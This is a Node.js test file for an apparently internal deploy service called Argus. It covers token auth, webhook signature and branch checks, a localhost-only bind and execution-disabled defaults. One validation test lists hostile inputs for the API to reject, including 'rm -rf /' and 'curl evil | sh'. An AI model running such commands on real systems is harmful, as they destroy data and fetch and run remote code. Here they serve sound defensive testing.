import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { join } from 'node:path';
import { mkdirSync } from 'node:fs';
import { loadConfig } from '../../shared/config/index.js';
import { createApp, start } from '../../services/argus/argus.js';
import { tmp, registryEntry, writeRegistry, signedPush, serve, makeConfigRepo } from '../helpers/argus-fixtures.js';

const TOKEN = 'test-internal-token';
const SECRET = 'test-webhook-secret';
const SHA = 'b'.repeat(40);

const root = tmp('api-');
const projects = join(root, 'projects');
mkdirSync(projects, { recursive: true });
const registryPath = writeRegistry(root, [
  registryEntry('node-ok', { secretRef: 'ARGUS_WEBHOOK_SECRET_NODE_OK' }),
  registryEntry('off-app', { enabled: false })
]);
const cfgRepo = makeConfigRepo();

const enabledConfig = loadConfig({
  env: {
    ARGUS_EXECUTION_ENABLED: 'true',
    ARGUS_MODE: 'isolated-test',
    PROJECTS_ROOT: projects,
    ARGUS_STATE_ROOT: join(root, 'state'),
    REGISTRY_PATH: registryPath,
    CONFIG_REPO_ROOT: cfgRepo.checkout
  }
});
const env = { ARGUS_INTERNAL_TOKEN: TOKEN, ARGUS_WEBHOOK_SECRET_NODE_OK: SECRET };

const servers = [];
after(async () => { for (const s of servers) await s.close(); });

async function enabled() {
  // A deploy is never actually run here: scheduler.submit is replaced so this
  // file exercises only auth/validation/routing (real deploys: lifecycle.test.js).
  const app = createApp(enabledConfig, { env });
  app.locals.argus.scheduler.submit = () => ({ started: true });
  const s = await serve(app);
  servers.push(s);
  return s;
}

const post = (base, path, body, headers = {}) =>
  fetch(`${base}${path}`, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: typeof body === 'string' ? body : JSON.stringify(body) });

test('execution is disabled by default (webhook 503, ops 501 after auth)', async () => {
  const s = await serve(createApp(loadConfig({ env: {} }), { env }));
  servers.push(s);
  const health = await (await fetch(`${s.base}/health`)).json();
  assert.equal(health.executionEnabled, false);
  assert.equal((await post(s.base, '/webhook', '{}')).status, 503);
  const op = await post(s.base, '/operations', { schemaVersion: 1, operation: 'health', application: 'node-ok' }, { authorization: `Bearer ${TOKEN}` });
  assert.equal(op.status, 501);
});

test('private API requires the token (missing / wrong → 401)', async () => {
  const s = await enabled();
  const body = { schemaVersion: 1, operation: 'health', application: 'node-ok' };
  assert.equal((await post(s.base, '/operations', body)).status, 401);
  assert.equal((await post(s.base, '/operations', body, { authorization: 'Bearer nope' })).status, 401);
  assert.equal((await fetch(`${s.base}/operations/op_x_00000000`)).status, 401);
});

test('unknown fields, unknown operations, unknown params and shell text are rejected', async () => {
  const s = await enabled();
  const auth = { authorization: `Bearer ${TOKEN}` };
  const bad = [
    { schemaVersion: 1, operation: 'deploy', application: 'node-ok', extra: 1 },
    { schemaVersion: 1, operation: 'exec', application: 'node-ok' },
    { schemaVersion: 1, operation: 'rm -rf /', application: 'node-ok' },
    { schemaVersion: 1, operation: 'deploy', application: 'node-ok', params: { command: 'curl evil | sh' } },
    { schemaVersion: 2, operation: 'deploy', application: 'node-ok' }
  ];
  for (const b of bad) assert.equal((await post(s.base, '/operations', b, auth)).status, 400, JSON.stringify(b));
});

test('webhook: signature/target/branch rules and auditable records', async () => {
  const s = await enabled();
  const send = (fullName, secret, extra = {}, event = 'push') => {
    const { body, sig } = signedPush({ fullName, after: SHA, secret, ...extra });
    return fetch(`${s.base}/webhook`, { method: 'POST', headers: { 'x-github-event': event, 'x-hub-signature-256': sig, 'content-type': 'application/json' }, body });
  };
  assert.equal((await send('fixture/node-ok', 'wrong')).status, 401);
  assert.equal((await send('nobody/unknown', SECRET)).status, 404);
  assert.equal((await send('fixture/off-app', SECRET)).status, 409);
  const ping = await send('fixture/node-ok', SECRET, {}, 'ping');
  assert.equal(ping.status, 200);

  const noop = await send('fixture/node-ok', SECRET, { ref: 'refs/heads/feature' });
  assert.equal(noop.status, 200);
  const noopBody = await noop.json();
  assert.equal(noopBody.noop, true);
  const rec = await (await fetch(`${s.base}/operations/${noopBody.operationId}`, { headers: { authorization: `Bearer ${TOKEN}` } })).json();
  assert.equal(rec.status, 'succeeded');
  assert.equal(rec.result.reason, 'branch-not-tracked');

  const ok = await send('fixture/node-ok', SECRET);
  assert.equal(ok.status, 202);
  assert.match((await ok.json()).operationId, /^op_/);

  const malformed = await fetch(`${s.base}/webhook`, { method: 'POST', headers: { 'x-github-event': 'push' }, body: '{oops' });
  assert.equal(malformed.status, 400);
});

test('Argus binds to 127.0.0.1 only; a public bind is refused at config load', async () => {
  const server = start(loadConfig({ env: { ARGUS_PORT: '46931' } }));
  await new Promise((r) => server.once('listening', r));
  try {
    assert.equal(server.address().address, '127.0.0.1');
  } finally {
    await new Promise((r) => server.close(r));
  }
  assert.throws(() => loadConfig({ env: { ARGUS_BIND: '0.0.0.0' } }), (e) => e.code === 'CONFIG_INVALID');
});

test('execution cannot be enabled outside isolated-test or against /projects', () => {
  const base = { ARGUS_EXECUTION_ENABLED: 'true', ARGUS_MODE: 'isolated-test', PROJECTS_ROOT: projects };
  assert.throws(() => loadConfig({ env: { ...base, ARGUS_MODE: 'local' } }), (e) => e.code === 'CONFIG_INVALID');
  assert.throws(() => loadConfig({ env: { ...base, PROJECTS_ROOT: '/projects' } }), (e) => e.code === 'CONFIG_INVALID');
  assert.throws(() => loadConfig({ env: { ...base, NODE_ENV: 'production', MANAGE_SESSION_SECRET: 'x', ARGUS_INTERNAL_TOKEN: 'y' } }), (e) => e.code === 'CONFIG_INVALID');
});
